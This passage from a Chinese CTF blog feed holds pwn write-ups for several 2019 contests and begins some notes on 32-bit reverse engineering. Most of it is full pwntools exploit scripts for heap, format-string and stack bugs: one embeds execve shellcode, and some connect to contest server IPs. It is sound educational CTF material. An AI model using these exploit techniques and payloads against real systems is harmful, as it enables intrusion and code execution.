punctuation">(</span><span class="token string">"puts"</span><span class="token punctuation">)</span>system_addr <span class="token operator">=</span> libcbase <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">"system"</span><span class="token punctuation">)</span>one_gad_get <span class="token operator">=</span> <span class="token number">0x4526a</span> <span class="token operator">+</span> libcbaser<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"bss:\n"</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">"libcbase =====> "</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>libcbase<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">"system_addr =====> "</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"b"</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"stack:\n"</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> offset <span class="token operator">*</span> <span class="token string">'a'</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bss_addr<span class="token number">-0x400</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>one_gad_get<span class="token punctuation">)</span> r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><blockquote><p><a href="https://xz.aliyun.com/t/5597" target="_blank" rel="noopener">https://xz.aliyun.com/t/5597</a>   万能gadget<br><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/fancy-rop-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/fancy-rop-zh/</a>  栈迁移</p><p>链接：<a href="https://pan.baidu.com/s/1OHPtwBpxynOIOvT1bwYSZw" target="_blank" rel="noopener">https://pan.baidu.com/s/1OHPtwBpxynOIOvT1bwYSZw</a><br>提取码：yxce</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF题解 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2019XMAN冬令营入营赛</title>
      <link href="/2020/01/11/2019xman-ru-ying-sai/"/>
      <url>/2020/01/11/2019xman-ru-ying-sai/</url>
      
        <content type="html"><![CDATA[<h1 id="2019XMAN入营赛"><a href="#2019XMAN入营赛" class="headerlink" title="2019XMAN入营赛"></a>2019XMAN入营赛</h1><p>XMAN训练营的题目，还是能学到不少东西的，就拿来看了看。</p><h3 id="babyarm"><a href="#babyarm" class="headerlink" title="babyarm"></a>babyarm</h3><p>这个题目并不难，难在于它是一个arm的架构，所以难以调试，不过从出题人哪里得到一个很好的github项目<strong>arm_now</strong>，但是我看了看还是没办法用pwntools远程连接上调试，Mr.R师傅说环境下载在arm_now里面然后在里面直接调，不走远程路线，这虽然麻烦一点，但是麻烦过后属实方便顺心，废话到此，分析题目。<br>checksec使得我们有个大致的了解：</p><pre><code>[*] &#39;/home/root0/pratice/2019xman\xe5\x86\xac\xe4\xbb\xa4\xe8\x90\xa5/babyarm/pwn&#39;    Arch:     arm-32-little    RELRO:    Partial RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      No PIE (0x10000)</code></pre><p>开了两个保护Canary found和NX，不过对这题堆利用影响不大。</p><p>漏洞在于delete函数没有将free后的堆块指针置NULL</p><img src="/2020/01/11/2019xman-ru-ying-sai/1.png" title="This is an image"><p>配合32位的unlink可以实现堆利用，不过这个题目方法很多样，unsorted bin attack泄露地址然后double free估计也可以，没试，哈哈哈，贴一个<a href="https://binlep.github.io/2019/12/24/%E3%80%90WriteUp%E3%80%91%E7%AC%AC%E4%B8%89%E5%B1%8A%E2%80%9C%E5%8D%8E%E4%B8%BA%E6%9D%AF%E2%80%9DXMan%E5%86%AC%E4%BB%A4%E8%90%A5%E9%80%89%E6%8B%94%E8%B5%9B%E9%A2%98%E8%A7%A3/" target="_blank" rel="noopener">binLep师傅</a>的脚本（也可以去看看师傅博客）:</p><pre><code>#!/usr/bin/env python# -*- coding: utf-8 -*-from pwn import *debug = 3context(log_level=&quot;debug&quot;, arch=&quot;arm&quot;, os=&quot;linux&quot;)if debug == 1:    p = process([&#39;qemu-arm&#39;, &#39;-g&#39;, &#39;12345&#39;, &#39;-L&#39;, &#39;/usr/arm-linux-gnueabihf&#39;, &#39;./chall&#39;])elif debug == 2:    p = process([&#39;qemu-arm&#39;, &#39;-L&#39;, &#39;/usr/arm-linux-gnueabihf&#39;, &#39;./chall&#39;])else:    p = remote(&#39;139.9.133.160&#39;, 10000)elf = ELF(&#39;./chall&#39;, checksec=False)def add(add_size, add_content):    p.sendafter(&#39;  your choice: \n&#39;, &#39;1&#39;)    p.sendlineafter(&#39;Note size :&#39;, str(add_size))    p.sendafter(&#39;Content :&#39;, add_content)def delete(delete_idx):    p.sendafter(&#39;  your choice: \n&#39;, &#39;2&#39;)    p.sendlineafter(&#39;Index :&#39;, str(delete_idx))def show(show_idx):    p.sendafter(&#39;  your choice: \n&#39;, &#39;3&#39;)    p.sendafter(&#39;Index :&#39;, str(show_idx))def edit(edit_idx, edit_content):    p.sendafter(&#39;  your choice: \n&#39;, &#39;5&#39;)    p.sendafter(&#39;Index :&#39;, str(edit_idx))    p.sendafter(&#39;You content:&#39;, edit_content)got_free = elf.got[&#39;free&#39;]got_atoi = elf.got[&#39;atoi&#39;]plt_puts = elf.plt[&#39;puts&#39;]addr_notelist = 0x02108caddr_count = 0x021064p.sendlineafter(&#39;Tell me your name:&#39;, &#39;binLep&#39;)add(0x40, &#39;a&#39; * 4)  # 1add(0x80, &#39;b&#39; * 4)  # 2add(0x80, &#39;c&#39; * 4)  # 3delete(1)delete(2)pd = p32(0) + p32(0x81)pd += p32(addr_notelist - 0xc) + p32(addr_notelist - 0x8)pd += &#39;d&#39; * 0x70pd += p32(0x80) + p32(0x80)add(0x100, pd)  # 4delete(2)pd = p32(0) + p32(0)pd += p32(got_atoi) + p32(got_free)edit(1, pd)add(0x80, &#39;/bin/sh&#39;)  # 5add(0x80, &#39;/bin/sh&#39;)  # 6add(0x80, &#39;/bin/sh&#39;)  # 7add(0x80, &#39;/bin/sh&#39;)  # 8add(0x80, &#39;/bin/sh&#39;)  # 9edit(1, p32(plt_puts))delete(0)addr_atoi = u32(p.recv(4))libcbase = addr_atoi - 0x025271addr_system = libcbase + 0x02c771addr_bin_sh = libcbase + 0x0ca574edit(1, p32(addr_system))success(&#39;addr_atoi   = &#39; + hex(addr_atoi))success(&#39;addr_system = &#39; + hex(addr_system))delete(7)p.interactive()</code></pre><h3 id="NoooCall"><a href="#NoooCall" class="headerlink" title="NoooCall"></a>NoooCall</h3><p>这个题目的难度在于禁用了所有的系统调用，不过跟红帽的比觉得还是简单一点。<br>你输入的被当做shellcode执行了</p><img src="/2020/01/11/2019xman-ru-ying-sai/2.png" title="This is an image"><p>这里面就是禁用了所有系统调用。</p><pre><code>#!/usr/bin/env python# coding=utf-8from pwn import * from string import printable #导入可打印的字符的字符串context(arch = &#39;amd64&#39;,os = &#39;linux&#39;)idx = 0x200000000flag = &quot;&quot;for j in range(0xd):    for i in printable:        r = process(&#39;./chall&#39;)        payload = &#39;&#39;&#39;            mov rdi,{}            cmp byte ptr [rdi],{}            jz $            ret        &#39;&#39;&#39;.format(hex(idx + j),ord(i))        payload = asm(payload)        r.recv()#        gdb.attach(r)        r.send(payload)        try:            r.recv(timeout=1)            flag += i            print &quot;key &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; &quot; + flag            break        except:            continueprint flagr.interactive()</code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF题解 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2019湖湘杯</title>
      <link href="/2019/11/20/2019-hu-xiang-bei/"/>
      <url>/2019/11/20/2019-hu-xiang-bei/</url>
      
        <content type="html"><![CDATA[<h3 id="练习赛"><a href="#练习赛" class="headerlink" title="练习赛"></a>练习赛</h3><p>一共两个pwn，第一个没啥说的，第二个是个格式化，但是由于格式化之前把握不深导致菜的一批，很感谢ditto师傅能够指点一波，看了师傅的博客，受益匪浅。<br>第一个尴尬点：</p><p>我在泄露的时候泄露出了一个(nil)的神奇东西，本来觉得可能是那些限制了，泄露不出来更多了，但是也没看到程序里面啥限制啊，最后知道了这个原来是null，%p是用来泄露指针的，它返回的地址如果是0x0000这样的，就会返回一个nil给你。</p><p>第二个尬点：我想着程序也没后门，格式化任意写到底该怎么写呢？也没给libc，自然也没想到one_gadget这个神奇的东西，还是师傅强，通过泄露地址知道这个是ubuntu 1604的，然后直接整个libc出来，然后就有one_gadget了。</p><p>第三个，这个如果是我的话，我可能最后会直接劫持printf_got，但是师傅tql，劫持的是printf的返回地址ret,然后劫持到了main函数，同时也劫持了setvbuf函数的got表</p><p>然后最后一个就是：我发现用ubuntu 1604本机的libc可以打通，但是用之前编译好的libc2.23打不通，后来问了大师傅才知道，自己编译的跟本地的还是差很多的，gcc版本，环境等都不太一样。<br>exp:</p><pre><code>#coding=utf-8from pwn import *exec_binary = &quot;./5c149c66064fa&quot;libcversion = &#39;2.23&#39;local = 1context.binary = exec_binarycontext.log_level = &quot;debug&quot;elf = ELF(exec_binary,checksec=False)if local:    r = process(exec_binary)    if context.arch == &quot;i386&quot;:        libc = ELF(&quot;/glibc/x86/{}/lib/libc-{}.so&quot;.format(libcversion,libcversion),checksec=False)    elif context.arch == &quot;amd64&quot;:        libc = ELF(&quot;/glibc/x64/{}/lib/libc-{}.so&quot;.format(libcversion,libcversion),checksec=False)else:    r = remote(&quot;183.129.189.60&quot;,10043)def get_base(r):    text_base = r.libs()[r._cwd+r.argv[0].strip(&#39;.&#39;)]    for key in r.libs():        if &quot;libc.so.6&quot; in key:            return text_base,r.libs()[key]def debug():    text_base,libc_base = get_base(r)    break_point = &quot;set $text_base=&quot;+str(text_base)+&#39;\n&#39;+&quot;set $libc_base=&quot;+str(libc_base)+&#39;\n&#39;    break_point+=&#39;&#39;&#39;    b *00000000004006DA    &#39;&#39;&#39;    gdb.attach(r)def confirm(address):    n = globals()    for key,value in n.items():        if value == address:                return success(key+&quot; ==&gt; &quot;+hex(address))offset = 8libc = ELF(&#39;./libc.so.6&#39;)r.sendline(&quot;%6$p%43$p&quot;)stack_addr = int(r.recv(14),16)confirm(stack_addr)libc_base = int(r.recv(14),16)-240-libc.symbols[&#39;__libc_start_main&#39;]confirm(libc_base)setvbuf_got = elf.got[&#39;setvbuf&#39;]system_addr = libc_base + 0x4526apayload=&quot;%&quot; + str(system_addr&amp;0xffff)+&#39;c&#39;+&quot;%10$hn&quot;payload=payload.ljust(16,&#39;a&#39;)payload+=p64(setvbuf_got)#debug()r.sendline(payload)payload=&quot;%&quot;+str((system_addr&gt;&gt;16)&amp;0xffff)+&#39;c&#39;+&quot;%10$hn&quot;payload=payload.ljust(16,&#39;a&#39;)payload+=p64(setvbuf_got+2)#debug()r.sendline(payload)ret_addr = stack_addr - 0x210confirm(ret_addr)main_addr = 0x0000000000400636payload = &quot;%&quot; + str(main_addr&amp;0xffff) + &#39;c&#39;+&quot;%10$hn&quot;payload=payload.ljust(16,&#39;a&#39;)payload+=p64(ret_addr)r.sendline(payload)r.interactive()</code></pre><h3 id="复赛"><a href="#复赛" class="headerlink" title="复赛"></a>复赛</h3><h4 id="Hackone"><a href="#Hackone" class="headerlink" title="Hackone"></a>Hackone</h4><p>首先就是一个off-by-one的漏洞：<br><img src="/2019/11/20/2019-hu-xiang-bei/1.png" title="This is an image"><br>如果刚好输入满堆块的内容，这里的strlen就会把下一个堆块的size位也算进来（strlen是遇到’\0’终止，最终长度不包含’\0’），那么两次edit就会造成off-by-one漏洞<br><img src="/2019/11/20/2019-hu-xiang-bei/2.png" title="This is an image"><br>我们可以溢出一个字节来修改下一个堆块的size位，从而可以overloping，</p><pre><code>#coding=utf-8from pwn import *exec_binary = &quot;./HackNote&quot;libcversion = &#39;2.23&#39;local = 1context.binary = exec_binarycontext.log_level = &quot;debug&quot;elf = ELF(exec_binary,checksec=False)if local:    r = process(exec_binary)    if context.arch == &quot;i386&quot;:        libc = ELF(&quot;/glibc/x86/{}/lib/libc-{}.so&quot;.format(libcversion,libcversion),checksec=False)    elif context.arch == &quot;amd64&quot;:        libc = ELF(&quot;/glibc/x64/{}/lib/libc-{}.so&quot;.format(libcversion,libcversion),checksec=False)else:    r = remote(&quot;&quot;)def get_base(r):    text_base = r.libs()[r._cwd+r.argv[0].strip(&#39;.&#39;)]    for key in r.libs():        if &quot;libc.so.6&quot; in key:            return text_base,r.libs()[key]def debug(addr):    text_base,libc_base = get_base(r)    break_point = &quot;set $text_base=&quot;+str(text_base)+&#39;\n&#39;+&quot;set $libc_base=&quot;+str(libc_base)+&#39;\n&#39;    break_point+=&quot;b *&quot; + str(addr) + &quot;\nc&quot;    gdb.attach(r,break_point)def confirm(address):    n = globals()    for key,value in n.items():        if value == address:            return success(key+&quot; ==&gt; &quot;+hex(address))def add(size,content):    r.sendlineafter(&#39;-----------------\n&#39;,&#39;1&#39;)    r.sendlineafter(&#39;nput the Size:\n&#39;,str(size))    r.sendafter(&#39;he Note:\n&#39;,content)def free(idx):    r.sendlineafter(&#39;-----------------\n&#39;,&#39;2&#39;)    r.sendlineafter(&#39;the Index of Note:\n&#39;,str(idx))def edit(idx,content):    r.sendlineafter(&#39;-----------------\n&#39;,&#39;3&#39;)    r.sendlineafter(&#39;Note\n&#39;,str(idx))    r.sendafter(&#39;Input the Note:\n&#39;,content)__malloc_hook = 0x0000000006CB788fake_chunk_addr = 0x6cb772add(0x38,&#39;aa\n&#39;) #0add(0x38,&#39;aa\n&#39;) #1add(0x38,&#39;aa\n&#39;) #2add(0x38,&#39;aa\n&#39;) #3add(0x38,&#39;aa\n&#39;) #4edit(0,&#39;a&#39;*0x38)edit(0,&#39;a&#39;*0x38 + &#39;\x81&#39;)free(1) add(0x71,&#39;aa\n&#39;) #1fake_chunk = [    &#39;a&#39;*0x38,0x41,    fake_chunk_addr,]#gdb.attach(r)#print flat(fake_chunk)free(2)edit(1,flat(fake_chunk)+&#39;\n&#39;)#gdb.attach(r)add(0x38,&#39;aa\n&#39;) #2payload = &#39;a&#39; * 6 + p64(__malloc_hook+8) payload+=&#39;\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05&#39;add(0x38,payload+&#39;\n&#39;) #5r.sendlineafter(&#39;-----------------\n&#39;,&#39;1&#39;)r.sendlineafter(&quot;Input the Size:\n&quot;,str(10))    #add(0x38,&#39;aa\n&#39;)  #6r.interactive()</code></pre><h4 id="NameSystem"><a href="#NameSystem" class="headerlink" title="NameSystem"></a>NameSystem</h4><p>还有一个，这个的漏洞是在于<br><img src="/2019/11/20/2019-hu-xiang-bei/3.png" title="This is an image"><br>可以形成double free，比如delete两次18实际上也delete一次19，然后再次delete就可能形成double free，那么就能形成一个指定地址写的操作，再次鸣谢ditto大佬，本来湖湘杯的时候都没看第二题，赛后ditto师傅给了个exp，后来想想还是学习学习，哈哈。</p><pre><code>#coding=utf-8from pwn import *local = 1exec_file=&quot;./NameSystem&quot;context.binary=exec_filecontext.terminal=[&quot;tmux&quot;,&quot;splitw&quot;,&quot;-h&quot;]elf=ELF(exec_file,checksec = False)if local :    a=process(exec_file)    if context.arch == &quot;i386&quot; :        libc=ELF(&quot;/lib/i386-linux-gnu/libc.so.6&quot;,checksec = False)    elif context.arch == &quot;amd64&quot; :        libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;,checksec = False) else:    a=remote(&quot;183.129.189.62&quot;,16605)def get_base(a):    text_base = a.libs()[a._cwd+a.argv[0].strip(&#39;.&#39;)]    for key in a.libs():        if &quot;libc.so.6&quot; in key:            return text_base,a.libs()[key]def debug():    text_base,libc_base=get_base(a)    script=&quot;set $text_base=&quot;+str(text_base)+&#39;\n&#39;+&quot;set $libc_base=&quot;+str(libc_base)+&#39;\n&#39;    script+=&#39;&#39;&#39;    b *0x000000000400A56    b *0x0000000000400B74    &#39;&#39;&#39;    gdb.attach(a,script)def fuck(address):    n = globals()    for key,value in n.items():        if value == address:            return success(key+&quot;  ==&gt;  &quot;+hex(address))def menu(idx):    a.sendlineafter(&quot;Your choice :\n&quot;,str(idx))def add(size,content):    menu(1)    a.sendlineafter(&quot;Name Size:&quot;,str(size))    a.sendafter(&quot;Name:&quot;,content)def delete(idx):    menu(3)    a.sendlineafter(&quot;The id you want to delete:&quot;,str(idx))ptr_addr = 0x6020A0ptr_end = 0x602138fake_chunk_addr = 0x601ffafor i in range(15):    add(0x28,&#39;A\n&#39;)add(0x38,&#39;\n&#39;)#15 add(0x58,&#39;\n&#39;)#16 0x603310add(0x58,&#39;\n&#39;)#17 0x0000000000603390add(0x58,&#39;\n&#39;)#18 0x0000000000603400add(0x58,&#39;\n&#39;)#19 0x0000000000603470delete(0)delete(19)delete(17)delete(17)add(0x38,&#39;\n&#39;)add(0x38,&#39;\n&#39;)add(0x38,&#39;\n&#39;)delete(0)delete(19)delete(17)delete(17)add(0x60,&#39;\n&#39;)add(0x60,&#39;\n&#39;)add(0x60,&#39;\n&#39;)delete(0) #delete(0)delete(19)   #这里是为了第三次double freefor i in range(9):    delete(0)delete(12-4)delete(12-4)add(0x58,p64(fake_chunk_addr)+&#39;\n&#39;) #把free劫持为putsadd(0x58,&#39;\n&#39;)add(0x58,&#39;\n&#39;)add(0x58,&#39;A&#39;*6+p64(0x41)+p64(elf.plt[&quot;puts&quot;])[:6]+&#39;\n&#39;)fake_chunk_addr = 0x60208d   #在标准输出流上写一个指针指向puts对应的got表得到puts的真实地址。add(0x60,p64(fake_chunk_addr)+&#39;\n&#39;)add(0x60,&#39;\n&#39;)add(0x60,&#39;\n&#39;)add(0x60,&#39;A&#39;*3+p64(0x602020)[:6]+&#39;\n&#39;)delete(0)libc_base=u64(a.recvuntil(&quot;\n&quot;,drop=True)+&#39;\x00\x00&#39;)-libc.symbols[&quot;puts&quot;]fuck(libc_base)fake_chunk_addr = 0x000000000602008add(0x38,p64(fake_chunk_addr)+&#39;\n&#39;)  #把free改成systemadd(0x38,&#39;\n&#39;)add(0x38,&#39;/bin/sh\n&#39;)add(0x38,p64(libc_base+libc.symbols[&quot;system&quot;])[:6]+&#39;\n&#39;)delete(17)a.interactive()</code></pre><p>最后说一下，这次湖湘杯真是力不从心，打的菜的一批，继续加油吧。</p>]]></content>
      
      
      <categories>
          
          <category> CTF题解 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2019I春秋答题赛</title>
      <link href="/2019/11/05/2019i-chun-qiu-da-ti-sai/"/>
      <url>/2019/11/05/2019i-chun-qiu-da-ti-sai/</url>
      
        <content type="html"><![CDATA[<h3 id="PWN2"><a href="#PWN2" class="headerlink" title="PWN2"></a>PWN2</h3><p>做出来了两个pwn题目（其中一个是复现出来的。。。。）：<br>首先说一个pwn2，这个题目真是让我张了不少知识，不仅理解了tcache和unsorted bin attack还学会怎么patch elf文件的libc和ld链接器，同时学了一波文件的_IO_stdout_，下面贴一个“改革春风吹满地”大佬写的exp</p><pre><code>#coding=utf-8from pwn import *local = 1exec_file=&quot;./easy_heap&quot;context.binary=exec_filecontext.terminal=[&quot;tmux&quot;,&quot;splitw&quot;,&quot;-h&quot;]elf=ELF(exec_file,checksec = False)if local :    argv=[&quot;/glibc/x64/2.27/lib/ld-2.27.so&quot;,&quot;--library-path&quot;,&quot;/glibc/x64/2.27/lib/&quot;,&quot;./easy_heap&quot;]    a=process(argv=argv)    libc=ELF(&quot;/glibc/x64/2.27/lib/libc.so.6&quot;)else:    a=remote(&quot;&quot;)def get_base(a):    text_base = a.libs()[a._cwd+a.argv[0].strip(&#39;.&#39;)]    for key in a.libs():        if &quot;libc.so.6&quot; in key:            return text_base,a.libs()[key]def debug():    #text_base,libc_base=get_base(a)    #script=&quot;set $text_base=&quot;+str(text_base)+&#39;\n&#39;+&quot;set $libc_base=&quot;+str(libc_base)+&#39;\n&#39;    script=&#39;&#39;&#39;    b *(0x7ffff7bd5000+0x0000000000009E2)    b *(0x7ffff7bd5000+0x00000000000009FE)    &#39;&#39;&#39;    gdb.attach(a,script)def fuck(address):    n = globals()    for key,value in n.items():        if value == address:            return success(key+&quot;  ==&gt;  &quot;+hex(address))def menu(idx,flag=True):    if flag:        a.sendlineafter(&quot;2. free\n&quot;,str(idx))    else:        a.sendlineafter(&quot;2. free&quot;,str(idx))def add(content,flag=True):    menu(1,flag)    if flag:        a.sendafter(&quot;content:\n&quot;,content)    else:        a.sendafter(&quot;content:&quot;,content)def delete(idx,flag=True):    menu(2,flag)    if flag:        a.sendlineafter(&quot;\n&quot;,str(idx))    else:        a.sendlineafter(&quot;:&quot;,str(idx))add(p64(0x91)+p64(0x91))#0 90是为了之后进入unsortbinadd(p64(0x21)*6)#1add(p64(0x21)*6)#2delete(0)delete(0)delete(0)add(&#39;\x70&#39;)#3 //修改最低字节这时候tcache的最后一个被改成0x70结尾add(&#39;A&#39;)#4 拿出一个add(&#39;A&#39;)#5 get fake chunk 拿到目标for i in range(8):  #多次free进入unsortedbin拿到arean地址    delete(5)add(&#39;\x60\x07\xbd&#39;)#6 地址修改到stdoutdelete(3)delete(3)delete(3)delete(3)add(&#39;\x70&#39;)#7add(&#39;\x70&#39;)#8add(&#39;/bin/sh\x00&#39;)#9add(p64(0xfbad1800)+p64(0)*3+&#39;\x00&#39;)#10a.recvuntil(p64(0xfbad1800))a.recvuntil(&quot;\x7f&quot;)libc_base=u64(a.recvuntil(&quot;\x7f&quot;)[-6:]+&#39;\x00\x00&#39;)-131-libc.symbols[&quot;_IO_2_1_stdout_&quot;]fuck(libc_base)delete(7,False)delete(7,False)add(p64(libc_base+libc.symbols[&quot;__free_hook&quot;]-8),False)#11add(&#39;A&#39;,False)add(&quot;/bin/sh\x00&quot;+p64(libc_base+libc.symbols[&quot;system&quot;]),False)delete(9,False)a.interactive()</code></pre><h3 id="PWN1"><a href="#PWN1" class="headerlink" title="PWN1"></a>PWN1</h3><p>还有就是一个栈的题目了，这个题目跟平常哪个格式化字符和栈溢出有所不同，因为它限制了格式化可以打印出的栈里面的数据，本来还有点没头绪，但是得大哥指点，64位的机子上寄存器里面还有很多参数呢，乌拉，果真在寄存器里面泄露出来了一个真实地址哦，真实顶哦：</p><pre><code>#!/usr/bin/env python# coding=utf-8from pwn import *context.log_level = &#39;debug&#39;r = remote(&#39;120.55.43.255&#39;,30022 )#r = process(&#39;./easy&#39;)libc = ELF(&#39;libc-2.23.so&#39;)r.recvuntil(&#39;Input your name:\n&#39;)one_gadget_offset = 0x4526apayload1 = &#39;%7$p&#39; #7payload3 = &#39;%3$p&#39; #7r.send(payload1)canary = int(r.recv()[0:18],16)print &#39;canary = &#39; + hex(canary)#r.recvuntil(&#39;note:\n&#39;)payload2 = &#39;a&#39; * 8 + p64(canary) + &#39;b&#39;*8 + &#39;\x30\x4a&#39;r.send(payload2)r.recvuntil(&#39;Input your name:\n&#39;)#gdb.attach(r)r.send(payload3)ret_1 = int(r.recv()[0:14],16) - 0xf7260#raw_input(&#39;@:&#39;)print &#39;addr = &#39; + hex(ret_1)system_addr = ret_1 + one_gadget_offsetr.recvuntil(&#39;Input the note:\n&#39;)print &#39;system_addr = &#39; + hex(system_addr)payload2 = &#39;a&#39; * 8 + p64(canary) + &#39;b&#39; * 8 + p64(system_addr)r.sendline(payload2)r.interactive()</code></pre><h3 id="RE1"><a href="#RE1" class="headerlink" title="RE1"></a>RE1</h3><p>这个就比较简单了，主要的难点可能就是一个苹果系统的文件，如果你没有mac,或者没有黑苹果的话，就没法子动态调试，不过base32还是比较容易看出的吧，然后在有一个简单的加密就可了。</p><pre><code>key = [1,2,3,1,4,5,6,7,8,9,10,11,12,13,14,6,15,16,5,17,4,15,10,24,15,18,11,19,20,6,5,1,13,18,17,12,5,10,13,1,44,17,3,13,5,52,4,13,17,21,43,11]flag = {1:&#39;G&#39;,2:&#39;5&#39;,3:&#39;S&#39;,4:&#39;I&#39;,5:&#39;Z&#39;,6:&#39;B&#39;,7:&#39;V&#39;,8:&#39;H&#39;,9:&#39;F&#39;,10:&#39;R&#39;,11:&#39;T&#39;,12:&#39;E&#39;,13:&#39;Y&#39;,14:&#39;L&#39;,15:&#39;M&#39;,16:&#39;U&#39;,17:&#39;D&#39;,18:&#39;4&#39;,19:&#39;Q&#39;,20:&#39;O&#39;,21:&#39;C&#39;,22:&#39;G5&#39;,23:&#39;5S&#39;,24:&#39;SG&#39;,25:&#39;GI&#39;,26:&#39;IZ&#39;,27:&#39;ZB&#39;,28:&#39;BV&#39;,29:&#39;VH&#39;,30:&#39;HF&#39;,31:&#39;FR&#39;,32:&#39;RT&#39;,33:&#39;TE&#39;,34:&#39;EY&#39;,35:&#39;YL&#39;,36:&#39;LB&#39;,37:&#39;BM&#39;,38:&#39;MU&#39;,39:&#39;UZ&#39;,40:&#39;ZD&#39;,41:&#39;DI&#39;,42:&#39;IM&#39;,43:&#39;MR&#39;,44:&#39;RS&#39;,45:&#39;SGM&#39;,46:&#39;M4&#39;,47:&#39;4T&#39;,48:&#39;TQ&#39;,49:&#39;QO&#39;,50:&#39;OB&#39;,51:&#39;BZ&#39;,52:&#39;ZG&#39;,53:&#39;GY&#39;,54:&#39;Y4&#39;,55:&#39;4D&#39;,56:&#39;DE&#39;,57:&#39;EZ&#39;,58:&#39;ZR&#39;,59:&#39;RY&#39;,60:&#39;YG&#39;,61:&#39;GR&#39;,62:&#39;RSD&#39;,63:&#39;DS&#39;,64:&#39;SY&#39;,65:&#39;YZ&#39;,66:&#39;ZZ&#39;,67:&#39;ZGI&#39;,68:&#39;IY&#39;,69:&#39;YD&#39;,70:&#39;DC&#39;,71:&#39;CM&#39;,72:&#39;MRT&#39;}s = &#39;&#39;for i in key:    s += flag[i]import base64print base64.b32decode(s)</code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF题解 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>32位逆向分析技术</title>
      <link href="/2019/09/17/32-wei-ni-xiang-fen-xi-ji-zhu/"/>
      <url>/2019/09/17/32-wei-ni-xiang-fen-xi-ji-zhu/</url>
      
        <content type="html"><![CDATA[<h4 id="汇编指令"><a href="#汇编指令" class="headerlink" title="汇编指令"></a>汇编指令</h4><ul><li>ret n : 在ret指令后给栈指针加上操作数</li><li>test eax,eax 如果eax的值为0，那么逻辑与的运算结果为0，设置ZF为1，否则ZF为0 </li><li>lea ：加载有效地址</li><li>sar : 有符号数右位移指令，这个是算术右位移，补全时用的最高位</li><li>shr : 无符号数右位移指令，这个是逻辑右位移，补全时用0</li><li>shl : 左位移指令，操作数的最高位进入标志位CF,最低位补零</li><li>cdq ：这个一般就是用在除法之前，然后作用就是把32位数字扩展成为64位数字，方法就是把eax的最高位全复制到edx中的每一位，进而形成一个64位数据</li></ul><h4 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h4><p><strong>局部变量</strong></p><ol><li>利用栈存放局部变量， 寻找变量：[ebp-xxx]  ，参数调用： [ebp+xxx] ，编译器也可以用 “push reg” 取代指令 “sub esp ,4” 来节省几个字节的空间，”pop ecx”之类的指令也有压缩栈空间的作用，另外局部变量的起始值是随机的，是其他函数执行后留在栈中的垃圾数据。</li><li>还可以利用寄存器来存放局部变量，除了栈占用的2个寄存器，编译器会利用剩下的6个通用寄存器尽可能有效的存放局部变量。</li></ol><p><strong>全局变量</strong></p><ul><li>全局变量通常位于.data段，程序访问全局变量一般会用一个固定的硬编码的地址进行寻址，如果放到了只读段则说明它是一个常量。</li></ul><p><strong>结构体和数组</strong></p><ul><li>其寻址方式一般是[基地址+n] 例如：mov eax, [407030h(基地址) + eax(偏移)]</li></ul><p><strong>虚函数</strong></p><ul><li>待学</li></ul><p><strong>控制语句</strong></p><ul><li>switch case : 跟if else 语句类似，但是如果case 的取值表示一个算术级数，那么编译器会利用一个跳转表来实现。此时jmp dword ptr [4*eax + 004010b0] 指令相当于switch(a) ，根据eax的值进行索引</li></ul><p><strong>转移指令</strong></p><ul><li>短转移：有条件和无条件跳转机器码均为2字节，转移的范围是-128-127字节</li><li>长转移：有条件转移6字节，两字节表示转移类型（je,jg,jns）,四字节表示转移偏移量。无条件转移5字节，因为jmp只需要一个字节，四字节表示偏移即可</li><li>子程序调用(call) : 一类是平常的，类似长转移，一种是调用的参数涉及寄存器，栈等值。例如：”call dword ptr [eax+2]”</li><li>位移量 = 目的地址 - 起始地址 - 跳转指令本身的长度</li></ul><h4 id="数学运算符"><a href="#数学运算符" class="headerlink" title="数学运算符"></a>数学运算符</h4><ul><li>整数加减法:<br>一般情况下就是add sub这些，但是因为编译优化的存在，这些明显的指令会被替换，lea指令允许用户在一个时钟内完成c = a + b + 78h的计算，其中a b c都是在有寄存器的情况下有效，会编译成lea c,[a+b+78h],这种技巧可以使多个变量的求和在一个指令周期内完成，同时可以通过任何寄存器返回结果。例如： lea eax,[eax+ecx+78h] 